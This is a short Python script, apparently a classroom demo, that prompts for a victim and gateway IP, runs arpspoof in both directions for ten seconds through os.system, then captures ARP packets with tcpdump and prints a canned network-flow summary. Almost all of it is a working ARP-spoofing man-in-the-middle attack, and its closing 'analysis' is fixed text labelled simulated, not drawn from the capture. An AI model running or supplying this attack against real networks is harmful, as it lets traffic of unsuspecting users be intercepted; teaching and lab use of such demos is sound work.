import os
import time

# Get victim and gateway IPs from the user
victim_ip = input("Enter the victim's IP address: ")
gateway_ip = input("Enter the gateway's IP address: ")

# Inform the student that ARP spoofing is starting
print(f"\nStarting ARP spoofing for 10 seconds...")

# Spoof victim pretending to be the gateway
spoof_victim_command = f"arpspoof -i eth0 -t {victim_ip} {gateway_ip} &"
print(f"🛑 Running command to spoof Victim IP {victim_ip}:")
print(f"   {spoof_victim_command}")
os.system(spoof_victim_command)

# Spoof gateway pretending to be the victim
spoof_gateway_command = f"arpspoof -i eth0 -t {gateway_ip} {victim_ip} &"
print(f"\n🔄 Running command to spoof Gateway IP {gateway_ip}:")
print(f"   {spoof_gateway_command}")
os.system(spoof_gateway_command)

# Run ARP spoofing for 10 seconds
time.sleep(10)

# Stop ARP spoofing after 10 seconds
print("\n❌ Stopping ARP spoofing after 10 seconds.")
os.system("pkill arpspoof")

# Start tcpdump to capture and filter ARP packets
print("\n📡 Capturing and analyzing ARP traffic in real-time with tcpdump:")
tcpdump_command = f"tcpdump -nn -i eth0 arp"
print(f"   {tcpdump_command}")
os.system(f"{tcpdump_command} -c 10")  # Capture the first 10 ARP packets

# Simulated final analysis (ASCII/CLI-based)
print("\n✅ ARP spoofing analysis completed. Here's a summary:")

# Display a simulated ASCII network flow diagram and summary
print("""
   ┌───────────────────────────────────────────────────┐
   │                NETWORK FLOW SUMMARY               │
   └───────────────────────────────────────────────────┘
                Attacker             Victim
             [ATTACKER IP]   <───>  [VICTIM IP]
             Spoofing Gateway IP: [GATEWAY IP]

  ARP Spoofing in action:
  - The attacker is pretending to be the gateway.
  - The victim is fooled into sending traffic to the attacker.

   ┌───────────────────────────────────────────────────┐
   │        ARP Spoofing Detected in ARP Responses      │
   └───────────────────────────────────────────────────┘
  Example:
  Who has [GATEWAY IP]? Tell [VICTIM IP] -> Attacker MAC
  Who has [VICTIM IP]? Tell [GATEWAY IP] -> Attacker MAC

  Network traffic was captured and spoofed ARP replies were detected.
  """)
